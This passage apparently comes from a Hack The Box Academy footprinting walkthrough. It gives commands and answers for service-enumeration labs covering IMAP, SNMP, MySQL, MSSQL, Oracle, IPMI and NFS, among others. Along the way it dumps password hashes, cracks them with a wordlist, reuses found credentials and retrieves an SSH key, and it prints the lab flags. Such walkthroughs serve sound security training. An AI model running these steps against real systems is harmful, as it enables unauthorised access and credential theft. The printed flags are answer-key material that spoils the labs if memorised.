</span><span id="__span-70-28"><a id="__codelineno-70-28" name="__codelineno-70-28"></a>&lt; A001 OK Pre-login capabilities listed, post-login capabilities have more.
</span><span id="__span-70-29"><a id="__codelineno-70-29" name="__codelineno-70-29"></a>&gt; A002 AUTHENTICATE PLAIN AHJvYmluAHJvYmlu
</span><span id="__span-70-30"><a id="__codelineno-70-30" name="__codelineno-70-30"></a>&lt; * CAPABILITY IMAP4rev1 SASL-IR LOGIN-REFERRALS ID ENABLE IDLE SORT SORT=DISPLAY THREAD=REFERENCES THREAD=REFS THREAD=ORDEREDSUBJECT MULTIAPPEND URL-PARTIAL CATENATE UNSELECT CHILDREN NAMESPACE UIDPLUS LIST-EXTENDED I18NLEVEL=1 CONDSTORE QRESYNC ESEARCH ESORT SEARCHRES WITHIN CONTEXT=SEARCH LIST-STATUS BINARY MOVE SNIPPET=FUZZY PREVIEW=FUZZY LITERAL+ NOTIFY SPECIAL-USE
</span><span id="__span-70-31"><a id="__codelineno-70-31" name="__codelineno-70-31"></a>&lt; A002 OK Logged in
</span><span id="__span-70-32"><a id="__codelineno-70-32" name="__codelineno-70-32"></a>&gt; A003 LIST &quot;&quot; *
</span><span id="__span-70-33"><a id="__codelineno-70-33" name="__codelineno-70-33"></a>&lt; * LIST (\Noselect \HasChildren) &quot;.&quot; DEV
</span><span id="__span-70-34"><a id="__codelineno-70-34" name="__codelineno-70-34"></a>* LIST (\Noselect \HasChildren) &quot;.&quot; DEV
</span><span id="__span-70-35"><a id="__codelineno-70-35" name="__codelineno-70-35"></a>&lt; * LIST (\Noselect \HasChildren) &quot;.&quot; DEV.DEPARTMENT
</span><span id="__span-70-36"><a id="__codelineno-70-36" name="__codelineno-70-36"></a>* LIST (\Noselect \HasChildren) &quot;.&quot; DEV.DEPARTMENT
</span><span id="__span-70-37"><a id="__codelineno-70-37" name="__codelineno-70-37"></a>&lt; * LIST (\HasNoChildren) &quot;.&quot; DEV.DEPARTMENT.INT
</span><span id="__span-70-38"><a id="__codelineno-70-38" name="__codelineno-70-38"></a>* LIST (\HasNoChildren) &quot;.&quot; DEV.DEPARTMENT.INT
</span><span id="__span-70-39"><a id="__codelineno-70-39" name="__codelineno-70-39"></a>&lt; * LIST (\HasNoChildren) &quot;.&quot; INBOX
</span><span id="__span-70-40"><a id="__codelineno-70-40" name="__codelineno-70-40"></a>* LIST (\HasNoChildren) &quot;.&quot; INBOX
</span><span id="__span-70-41"><a id="__codelineno-70-41" name="__codelineno-70-41"></a>&lt; A003 OK List completed (0.009 + 0.000 + 0.008 secs).
</span><span id="__span-70-42"><a id="__codelineno-70-42" name="__codelineno-70-42"></a>* Connection #0 to host dev.inlanefreight.htb left intact
</span></code></pre></div></td></tr></table></div>
<p>Results: HTB{roncfbw7iszerd7shni7jr2343zhrj}</p>
<p><strong>What is the customized version of the POP3 server?</strong></p>
<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-71-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-71-1"><a id="__codelineno-71-1" name="__codelineno-71-1"></a>openssl s_client -connect $ip:pop3s
</span></code></pre></div></td></tr></table></div>
<p>Results: InFreight POP3 v9.188</p>
<p><strong>What is the admin email address?</strong></p>
<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-72-1"> 1</a></span>
<span class="normal"><a href="#__codelineno-72-2"> 2</a></span>
<span class="normal"><a href="#__codelineno-72-3"> 3</a></span>
<span class="normal"><a href="#__codelineno-72-4"> 4</a></span>
<span class="normal"><a href="#__codelineno-72-5"> 5</a></span>
<span class="normal"><a href="#__codelineno-72-6"> 6</a></span>
<span class="normal"><a href="#__codelineno-72-7"> 7</a></span>
<span class="normal"><a href="#__codelineno-72-8"> 8</a></span>
<span class="normal"><a href="#__codelineno-72-9"> 9</a></span>
<span class="normal"><a href="#__codelineno-72-10">10</a></span>
<span class="normal"><a href="#__codelineno-72-11">11</a></span>
<span class="normal"><a href="#__codelineno-72-12">12</a></span>
<span class="normal"><a href="#__codelineno-72-13">13</a></span>
<span class="normal"><a href="#__codelineno-72-14">14</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-72-1"><a id="__codelineno-72-1" name="__codelineno-72-1"></a># Establish a imap connection
</span><span id="__span-72-2"><a id="__codelineno-72-2" name="__codelineno-72-2"></a>openssl s_client -connect $ip:imaps
</span><span id="__span-72-3"><a id="__codelineno-72-3" name="__codelineno-72-3"></a>
</span><span id="__span-72-4"><a id="__codelineno-72-4" name="__codelineno-72-4"></a># Login as user robin with password robin
</span><span id="__span-72-5"><a id="__codelineno-72-5" name="__codelineno-72-5"></a>a LOGIN robin robin
</span><span id="__span-72-6"><a id="__codelineno-72-6" name="__codelineno-72-6"></a>
</span><span id="__span-72-7"><a id="__codelineno-72-7" name="__codelineno-72-7"></a># List inboxes
</span><span id="__span-72-8"><a id="__codelineno-72-8" name="__codelineno-72-8"></a>a LIST &quot;&quot; *
</span><span id="__span-72-9"><a id="__codelineno-72-9" name="__codelineno-72-9"></a>
</span><span id="__span-72-10"><a id="__codelineno-72-10" name="__codelineno-72-10"></a># Select one of them
</span><span id="__span-72-11"><a id="__codelineno-72-11" name="__codelineno-72-11"></a>a SELECT DEV.DEPARTMENT.INT
</span><span id="__span-72-12"><a id="__codelineno-72-12" name="__codelineno-72-12"></a>
</span><span id="__span-72-13"><a id="__codelineno-72-13" name="__codelineno-72-13"></a># Retrieves the messages by ID
</span><span id="__span-72-14"><a id="__codelineno-72-14" name="__codelineno-72-14"></a>a FETCH 1 all
</span></code></pre></div></td></tr></table></div>
<p>Results: devadmin@inlanefreight.htb</p>
<p><strong>Try to access the emails on the IMAP server and submit the flag as the answer. (Format: HTB{...})</strong></p>
<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-73-1"> 1</a></span>
<span class="normal"><a href="#__codelineno-73-2"> 2</a></span>
<span class="normal"><a href="#__codelineno-73-3"> 3</a></span>
<span class="normal"><a href="#__codelineno-73-4"> 4</a></span>
<span class="normal"><a href="#__codelineno-73-5"> 5</a></span>
<span class="normal"><a href="#__codelineno-73-6"> 6</a></span>
<span class="normal"><a href="#__codelineno-73-7"> 7</a></span>
<span class="normal"><a href="#__codelineno-73-8"> 8</a></span>
<span class="normal"><a href="#__codelineno-73-9"> 9</a></span>
<span class="normal"><a href="#__codelineno-73-10">10</a></span>
<span class="normal"><a href="#__codelineno-73-11">11</a></span>
<span class="normal"><a href="#__codelineno-73-12">12</a></span>
<span class="normal"><a href="#__codelineno-73-13">13</a></span>
<span class="normal"><a href="#__codelineno-73-14">14</a></span>
<span class="normal"><a href="#__codelineno-73-15">15</a></span>
<span class="normal"><a href="#__codelineno-73-16">16</a></span>
<span class="normal"><a href="#__codelineno-73-17">17</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-73-1"><a id="__codelineno-73-1" name="__codelineno-73-1"></a># Establish a imap connection
</span><span id="__span-73-2"><a id="__codelineno-73-2" name="__codelineno-73-2"></a>openssl s_client -connect $ip:imaps
</span><span id="__span-73-3"><a id="__codelineno-73-3" name="__codelineno-73-3"></a>
</span><span id="__span-73-4"><a id="__codelineno-73-4" name="__codelineno-73-4"></a># Login as user robin with password robin
</span><span id="__span-73-5"><a id="__codelineno-73-5" name="__codelineno-73-5"></a>a LOGIN robin robin
</span><span id="__span-73-6"><a id="__codelineno-73-6" name="__codelineno-73-6"></a>
</span><span id="__span-73-7"><a id="__codelineno-73-7" name="__codelineno-73-7"></a># List inboxes
</span><span id="__span-73-8"><a id="__codelineno-73-8" name="__codelineno-73-8"></a>a LIST &quot;&quot; *
</span><span id="__span-73-9"><a id="__codelineno-73-9" name="__codelineno-73-9"></a>
</span><span id="__span-73-10"><a id="__codelineno-73-10" name="__codelineno-73-10"></a># Select one of them
</span><span id="__span-73-11"><a id="__codelineno-73-11" name="__codelineno-73-11"></a>a SELECT DEV.DEPARTMENT.INT
</span><span id="__span-73-12"><a id="__codelineno-73-12" name="__codelineno-73-12"></a>
</span><span id="__span-73-13"><a id="__codelineno-73-13" name="__codelineno-73-13"></a># Retrieve the messages by ID
</span><span id="__span-73-14"><a id="__codelineno-73-14" name="__codelineno-73-14"></a>a FETCH 1 all
</span><span id="__span-73-15"><a id="__codelineno-73-15" name="__codelineno-73-15"></a>
</span><span id="__span-73-16"><a id="__codelineno-73-16" name="__codelineno-73-16"></a># Retrieve the content of the message with id 1
</span><span id="__span-73-17"><a id="__codelineno-73-17" name="__codelineno-73-17"></a>a FETCH 1 BODY.PEEK[TEXT]
</span></code></pre></div></td></tr></table></div>
<p>Results:  HTB{983uzn8jmfgpd8jmof8c34n7zio}</p>
<h4 id="snmp">SNMP</h4>
<p><strong>Enumerate the SNMP service and obtain the email address of the admin. Submit it as the answer.</strong></p>
<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-74-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-74-1"><a id="__codelineno-74-1" name="__codelineno-74-1"></a>snmpwalk -v2c -c public $ip
</span></code></pre></div></td></tr></table></div>
<p>Results: devadmin@inlanefreight.htb</p>
<p><strong>What is the customized version of the SNMP server?</strong></p>
<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-75-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-75-1"><a id="__codelineno-75-1" name="__codelineno-75-1"></a>snmpwalk -v2c -c public $ip
</span></code></pre></div></td></tr></table></div>
<p>Results: InFreight SNMP v0.91</p>
<p><strong>Enumerate the custom script that is running on the system and submit its output as the answer.</strong></p>
<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-76-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-76-1"><a id="__codelineno-76-1" name="__codelineno-76-1"></a>snmpwalk -v2c -c public $ip
</span></code></pre></div></td></tr></table></div>
<p>Results: HTB{5nMp_fl4g_uidhfljnsldiuhbfsdij44738b2u763g}</p>
<h4 id="mysql">MySQL</h4>
<p><strong>Enumerate the MySQL server and determine the version in use. (Format: MySQL X.X.XX)</strong></p>
<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-77-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-77-1"><a id="__codelineno-77-1" name="__codelineno-77-1"></a>sudo nmap -sS -sV --script mysql-empty-password -p 3306 $ip -Pn
</span></code></pre></div></td></tr></table></div>
<p>Results: MySQL 8.0.27</p>
<p><strong>During our penetration test, we found weak credentials "robin:robin". We should try these against the MySQL server. What is the email address of the customer "Otto Lang"?</strong></p>
<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-78-1">1</a></span>
<span class="normal"><a href="#__codelineno-78-2">2</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-78-1"><a id="__codelineno-78-1" name="__codelineno-78-1"></a>mysql -u robin -probin -h $ip
</span><span id="__span-78-2"><a id="__codelineno-78-2" name="__codelineno-78-2"></a>select * from customers.myTable where name LIKE &quot;Otto Lang&quot;;
</span></code></pre></div></td></tr></table></div>
<p>Results: ultrices@google.htb</p>
<h4 id="mssql">MSSQL</h4>
<p><strong>Enumerate the target using the concepts taught in this section. List the hostname of MSSQL server.</strong></p>
<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-79-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-79-1"><a id="__codelineno-79-1" name="__codelineno-79-1"></a>nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER -sV -p 1433 $ip
</span></code></pre></div></td></tr></table></div>
<p>Results: ILF-SQL-01</p>
<p><strong>Connect to the MSSQL instance running on the target using the account (backdoor:Password1), then list the non-default database present on the server.</strong></p>
<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-80-1">1</a></span>
<span class="normal"><a href="#__codelineno-80-2">2</a></span>
<span class="normal"><a href="#__codelineno-80-3">3</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-80-1"><a id="__codelineno-80-1" name="__codelineno-80-1"></a>mssqlclient.py backdoor@$ip -windows-auth -p 1433
</span><span id="__span-80-2"><a id="__codelineno-80-2" name="__codelineno-80-2"></a>
</span><span id="__span-80-3"><a id="__codelineno-80-3" name="__codelineno-80-3"></a>SELECT name FROM master.dbo.sysdatabases
</span></code></pre></div></td></tr></table></div>
<p>Results: Employees</p>
<h4 id="oracle-tns">Oracle TNS</h4>
<p>Enumerate the target Oracle database and submit the password hash of the user DBSNMP as the answer.</p>
<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-81-1">1</a></span>
<span class="normal"><a href="#__codelineno-81-2">2</a></span>
<span class="normal"><a href="#__codelineno-81-3">3</a></span>
<span class="normal"><a href="#__codelineno-81-4">4</a></span>
<span class="normal"><a href="#__codelineno-81-5">5</a></span>
<span class="normal"><a href="#__codelineno-81-6">6</a></span>
<span class="normal"><a href="#__codelineno-81-7">7</a></span>
<span class="normal"><a href="#__codelineno-81-8">8</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-81-1"><a id="__codelineno-81-1" name="__codelineno-81-1"></a>python3 ./odat.py all -s $ip
</span><span id="__span-81-2"><a id="__codelineno-81-2" name="__codelineno-81-2"></a># With this we obtain the creds scott/tiger
</span><span id="__span-81-3"><a id="__codelineno-81-3" name="__codelineno-81-3"></a>
</span><span id="__span-81-4"><a id="__codelineno-81-4" name="__codelineno-81-4"></a># Now we connect to the database
</span><span id="__span-81-5"><a id="__codelineno-81-5" name="__codelineno-81-5"></a>sqlplus scott/tiger@$ip/XE as sysdba
</span><span id="__span-81-6"><a id="__codelineno-81-6" name="__codelineno-81-6"></a>
</span><span id="__span-81-7"><a id="__codelineno-81-7" name="__codelineno-81-7"></a># Extract Password Hashes
</span><span id="__span-81-8"><a id="__codelineno-81-8" name="__codelineno-81-8"></a>select name, password from sys.user$;
</span></code></pre></div></td></tr></table></div>
<p>Results: E066D214D5421CCC</p>
<h4 id="ipmi">IPMI</h4>
<p><strong>What username is configured for accessing the host via IPMI?</strong></p>
<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-82-1">1</a></span>
<span class="normal"><a href="#__codelineno-82-2">2</a></span>
<span class="normal"><a href="#__codelineno-82-3">3</a></span>
<span class="normal"><a href="#__codelineno-82-4">4</a></span>
<span class="normal"><a href="#__codelineno-82-5">5</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-82-1"><a id="__codelineno-82-1" name="__codelineno-82-1"></a>sudo msfdb init
</span><span id="__span-82-2"><a id="__codelineno-82-2" name="__codelineno-82-2"></a>msfconsole -q
</span><span id="__span-82-3"><a id="__codelineno-82-3" name="__codelineno-82-3"></a>use auxiliary/scanner/ipmi/ipmi_dumphashes
</span><span id="__span-82-4"><a id="__codelineno-82-4" name="__codelineno-82-4"></a>setg RHOSTS $ip
</span><span id="__span-82-5"><a id="__codelineno-82-5" name="__codelineno-82-5"></a>run
</span></code></pre></div></td></tr></table></div>
<p>Results: admin</p>
<p><strong>What is the account's cleartext password?</strong></p>
<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-83-1">1</a></span>
<span class="normal"><a href="#__codelineno-83-2">2</a></span>
<span class="normal"><a href="#__codelineno-83-3">3</a></span>
<span class="normal"><a href="#__codelineno-83-4">4</a></span>
<span class="normal"><a href="#__codelineno-83-5">5</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-83-1"><a id="__codelineno-83-1" name="__codelineno-83-1"></a>sudo msfdb init
</span><span id="__span-83-2"><a id="__codelineno-83-2" name="__codelineno-83-2"></a>msfconsole -q
</span><span id="__span-83-3"><a id="__codelineno-83-3" name="__codelineno-83-3"></a>use auxiliary/scanner/ipmi/ipmi_dumphashes
</span><span id="__span-83-4"><a id="__codelineno-83-4" name="__codelineno-83-4"></a>set PASS_FILE /usr/share/wordlists/rockyou.txt
</span><span id="__span-83-5"><a id="__codelineno-83-5" name="__codelineno-83-5"></a>run
</span></code></pre></div></td></tr></table></div>
<p>Results: trinity</p>
<h3 id="skills-assessment">Skills assessment</h3>
<h4 id="footprinting-lab-easy">Footprinting Lab - Easy</h4>
<p>We were commissioned by the company <code>Inlanefreight Ltd</code> to test three different servers in their internal network. The company uses many different services, and the IT security department felt that a penetration test was necessary to gain insight into their overall security posture. The first server is an internal DNS server that needs to be investigated. In particular, our client wants to know what information we can get out of these services and how this information could be used against its infrastructure. Our goal is to gather as much information as possible about the server and find ways to use that information against the company. However, our client has made it clear that it is forbidden to attack the services aggressively using exploits, as these services are in production. Additionally, our teammates have found the following credentials "ceil:qwer1234", and they pointed out that some of the company's employees were talking about SSH keys on a forum. The administrators have stored a <code>flag.txt</code> file on this server to track our progress and measure success. Fully enumerate the target and submit the contents of this file as proof.</p>
<p><strong>Enumerate the server carefully and find the flag.txt file. Submit the contents of this file as the answer.</strong></p>
<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-84-1"> 1</a></span>
<span class="normal"><a href="#__codelineno-84-2"> 2</a></span>
<span class="normal"><a href="#__codelineno-84-3"> 3</a></span>
<span class="normal"><a href="#__codelineno-84-4"> 4</a></span>
<span class="normal"><a href="#__codelineno-84-5"> 5</a></span>
<span class="normal"><a href="#__codelineno-84-6"> 6</a></span>
<span class="normal"><a href="#__codelineno-84-7"> 7</a></span>
<span class="normal"><a href="#__codelineno-84-8"> 8</a></span>
<span class="normal"><a href="#__codelineno-84-9"> 9</a></span>
<span class="normal"><a href="#__codelineno-84-10">10</a></span>
<span class="normal"><a href="#__codelineno-84-11">11</a></span>
<span class="normal"><a href="#__codelineno-84-12">12</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-84-1"><a id="__codelineno-84-1" name="__codelineno-84-1"></a>ftp $ip -p 2121
</span><span id="__span-84-2"><a id="__codelineno-84-2" name="__codelineno-84-2"></a># enter user `ceil` and password `qwer1234`
</span><span id="__span-84-3"><a id="__codelineno-84-3" name="__codelineno-84-3"></a>
</span><span id="__span-84-4"><a id="__codelineno-84-4" name="__codelineno-84-4"></a>ls -la
</span><span id="__span-84-5"><a id="__codelineno-84-5" name="__codelineno-84-5"></a>cd .ssh
</span><span id="__span-84-6"><a id="__codelineno-84-6" name="__codelineno-84-6"></a>get id_rsa ~/.ssh/
</span><span id="__span-84-7"><a id="__codelineno-84-7" name="__codelineno-84-7"></a>quit
</span><span id="__span-84-8"><a id="__codelineno-84-8" name="__codelineno-84-8"></a>
</span><span id="__span-84-9"><a id="__codelineno-84-9" name="__codelineno-84-9"></a>chmod 600 ~/.ssh/id_rsa
</span><span id="__span-84-10"><a id="__codelineno-84-10" name="__codelineno-84-10"></a>ssh -i ~/.ssh/id_rsa ceil@$ip
</span><span id="__span-84-11"><a id="__codelineno-84-11" name="__codelineno-84-11"></a>find / -name flag.txt 2&gt;/dev/null
</span><span id="__span-84-12"><a id="__codelineno-84-12" name="__codelineno-84-12"></a>cat /home/flag/flag.txt
</span></code></pre></div></td></tr></table></div>
<p>Results:  HTB{7nrzise7hednrxihskjed7nzrgkweunj47zngrhdbkjhgdfbjkc7hgj}</p>
<h4 id="footprinting-lab-medium">Footprinting Lab - Medium</h4>
<p>This second server is a server that everyone on the internal network has access to. In our discussion with our client, we pointed out that these servers are often one of the main targets for attackers and that this server should be added to the scope. Our customer agreed to this and added this server to our scope. Here, too, the goal remains the same. We need to find out as much information as possible about this server and find ways to use it against the server itself. For the proof and protection of customer data, a user named <code>HTB</code> has been created. Accordingly, we need to obtain the credentials of this user as proof.</p>
<p><strong>Enumerate the server carefully and find the username "HTB" and its password. Then, submit this user's password as the answer.</strong></p>
<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-85-1"> 1</a></span>
<span class="normal"><a href="#__codelineno-85-2"> 2</a></span>
<span class="normal"><a href="#__codelineno-85-3"> 3</a></span>
<span class="normal"><a href="#__codelineno-85-4"> 4</a></span>
<span class="normal"><a href="#__codelineno-85-5"> 5</a></span>
<span class="normal"><a href="#__codelineno-85-6"> 6</a></span>
<span class="normal"><a href="#__codelineno-85-7"> 7</a></span>
<span class="normal"><a href="#__codelineno-85-8"> 8</a></span>
<span class="normal"><a href="#__codelineno-85-9"> 9</a></span>
<span class="normal"><a href="#__codelineno-85-10">10</a></span>
<span class="normal"><a href="#__codelineno-85-11">11</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-85-1"><a id="__codelineno-85-1" name="__codelineno-85-1"></a>sudo nmap -sS -sV -top-ports 4000 $ip
</span><span id="__span-85-2"><a id="__codelineno-85-2" name="__codelineno-85-2"></a>
</span><span id="__span-85-3"><a id="__codelineno-85-3" name="__codelineno-85-3"></a># We will attack firts service 2049
</span><span id="__span-85-4"><a id="__codelineno-85-4" name="__codelineno-85-4"></a>showmount -e $ip
</span><span id="__span-85-5"><a id="__codelineno-85-5" name="__codelineno-85-5"></a>mkdir target-NFS
</span><span id="__span-85-6"><a id="__codelineno-85-6" name="__codelineno-85-6"></a>sudo mount -t nfs $ip:/ ./target-NFS/ -o nolock
</span><span id="__span-85-7"><a id="__codelineno-85-7" name="__codelineno-85-7"></a>cd target-NFS
</span><span id="__span-85-8"><a id="__codelineno-85-8" name="__codelineno-85-8"></a>
</span><span id="__span-85-9"><a id="__codelineno-85-9" name="__codelineno-85-9"></a>sudo ls -la
</span><span id="__span-85-10"><a id="__codelineno-85-10" name="__codelineno-85-10"></a>sudo ls -la TechSupport
</span><span id="__span-85-11"><a id="__codelineno-85-11" name="__codelineno-85-11"></a>sudo cat TechSupport/ticket4238791283782.txt
</span></code></pre></div></td></tr></table></div>
<p>Credentials are obtained for accessing a different service:</p>
<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-86-1">1</a></span>
<span class="normal"><a href="#__codelineno-86-2">2</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-86-1"><a id="__codelineno-86-1" name="__codelineno-86-1"></a> 5    user=&quot;alex&quot;
</span><span id="__span-86-2"><a id="__codelineno-86-2" name="__codelineno-86-2"></a> 6    password=&quot;lol123!mD&quot;
</span></code></pre></div></td></tr></table></div>
<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-87-1">1</a></span>
<span class="normal"><a href="#__codelineno-87-2">2</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-87-1"><a id="__codelineno-87-1" name="__codelineno-87-1"></a># Now we connect to 3389 RDP:
</span><span id="__span-87-2"><a id="__codelineno-87-2" name="__codelineno-87-2"></a>xfreerdp /cert:ignore /u:alex /p:&quot;lol123\!mD&quot; /v:$ip
</span></code></pre></div></td></tr></table></div>
<p>A Windows connection opens up.</p>
<p>We browse the machine and find <code>C:\Users\alex\devshare\important</code> file, that contains the following creds:</p>
<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-88-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-88-1"><a id="__codelineno-88-1" name="__codelineno-88-1"></a>sa:87N1ns@slls83
</span></code></pre></div></td></tr></table></div>
<p>Right click on Microsoft SQL Server Management Studio and select "Execute as Administrator". Enter the creds <code>87N1ns@slls83</code>. Now we connect to the server:</p>
<p><img alt="sql" src="../img/htb-academy-footprinting-module_00.png" /> </p>
<p>Browse around, but the final SQL query would be</p>
<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-89-1">1</a></span>
<span class="normal"><a href="#__codelineno-89-2">2</a></span>
<span class="normal"><a href="#__codelineno-89-3">3</a></span>
<span class="normal"><a href="#__codelineno-89-4">4</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-89-1"><a id="__codelineno-89-1" name="__codelineno-89-1"></a>SELECT TOP (1000) [id]
</span><span id="__span-89-2"><a id="__codelineno-89-2" name="__codelineno-89-2"></a>      ,[name]
</span><span id="__span-89-3"><a id="__codelineno-89-3" name="__codelineno-89-3"></a>      ,[password]
</span><span id="__span-89-4"><a id="__codelineno-89-4" name="__codelineno-89-4"></a>  FROM [accounts].[dbo].[devsacc]
</span></code></pre></div></td></tr></table></div>
<p>Results: lnch7ehrdn43i7AoqVPK4zWR</p>
<h4 id="footprinting-lab-hard">Footprinting Lab - Hard</h4>
<p>The third server is an MX and management server for the internal network. Subsequently, this server has the function of a backup server for the internal accounts in the domain. Accordingly, a user named <code>HTB</code> was also created here, whose credentials we need to access.</p>
<p><strong>Enumerate the server carefully and find the username "HTB" and its password. Then, submit HTB's password as the answer.</strong></p>
<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-90-1">1</a></span>
<span class="normal"><a href="#__codelineno-90-2">2</a></span>
<span class="normal"><a href="#__codelineno-90-3">3</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-90-1"><a id="__codelineno-90-1" name="__codelineno-90-1"></a># Enumerate TCP and UDP
</span><span id="__span-90-2"><a id="__codelineno-90-2" name="__codelineno-90-2"></a>sudo nmap -sS -sV -top-ports 4000 $ip
</span><span id="__span-90-3"><a id="__codelineno-90-3" name="__codelineno-90-3"></a>sudo nmap $ip -sU   
</span></code></pre></div></td></tr></table></div>
<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-91-1">1</a></span>
<span class="normal"><a href="#__codelineno-91-2">2</a></span>
<span class="normal"><a href="#__codelineno-91-3">3</a></span>
<span class="normal"><a href="#__codelineno-91-4">4</a></span>
<span class="normal"><a href="#__codelineno-91-5">5</a></span>
<span class="normal"><a href="#__codelineno-91-6">6</a></span>
<span class="normal"><a href="#__codelineno-91-7">7</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-91-1"><a id="__codelineno-91-1" name="__codelineno-91-1"></a>PORT    STATE SERVICE  VERSION
</span><span id="__span-91-2"><a id="__codelineno-91-2" name="__codelineno-91-2"></a>22/tcp  open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
</span><span id="__span-91-3"><a id="__codelineno-91-3" name="__codelineno-91-3"></a>110/tcp open  pop3     Dovecot pop3d
</span><span id="__span-91-4"><a id="__codelineno-91-4" name="__codelineno-91-4"></a>143/tcp open  imap     Dovecot imapd (Ubuntu)
</span><span id="__span-91-5"><a id="__codelineno-91-5" name="__codelineno-91-5"></a>993/tcp open  ssl/imap Dovecot imapd (Ubuntu)
</span><span id="__span-91-6"><a id="__codelineno-91-6" name="__codelineno-91-6"></a>995/tcp open  ssl/pop3 Dovecot pop3d
</span><span id="__span-91-7"><a id="__codelineno-91-7" name="__codelineno-91-7"></a>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
</span></code></pre></div></td></tr></table></div>
<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-92-1">1</a></span>
<span class="normal"><a href="#__codelineno-92-2">2</a></span>
<span class="normal"><a href="#__codelineno-92-3">3</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-92-1"><a id="__codelineno-92-1" name="__codelineno-92-1"></a>PORT    STATE         SERVICE
</span><span id="__span-92-2"><a id="__codelineno-92-2" name="__codelineno-92-2"></a>68/udp  open|filtered dhcpc
</span><span id="__span-92-3"><a id="__codelineno-92-3" name="__codelineno-92-3"></a>161/udp open          snmp
</span></code></pre></div></td></tr></table></div>
<p>We start with SNMP vulnerabilities:</p>
<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-93-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-93-1"><a id="__codelineno-93-1" name="__codelineno-93-1"></a>onesixtyone -c /usr/share/seclists/Discovery/SNMP/snmp.txt $ip
</span></code></pre></div></td></tr></table></div>
<p>In the result, you can spot the <code>community string</code> <code>backup</code>. Now, we can use braa:</p>
<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-94-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-94-1"><a id="__codelineno-94-1" name="__codelineno-94-1"></a>braa backup@$ip:.1.3.6.* 
